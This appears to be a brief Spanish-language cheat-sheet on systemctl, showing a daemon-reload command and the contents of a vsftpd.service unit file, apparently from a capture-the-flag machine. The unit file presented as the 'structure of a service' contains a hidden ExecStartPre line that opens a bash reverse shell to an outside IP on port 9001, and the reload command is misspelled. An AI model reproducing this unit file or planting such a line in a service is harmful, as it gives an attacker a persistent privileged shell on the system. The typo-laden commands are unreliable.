# Systemctl


## Reiniciar los deamonds

```bash
systemctl daemn-reload
```

## Estructura de un servicio

```bash
drac@ide:/lib/systemd/system$ cat vsftpd.service 
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.253.213/9001 0>&1"

[Install]
WantedBy=multi-user.target
drac@ide:/lib/systemd/syste
```
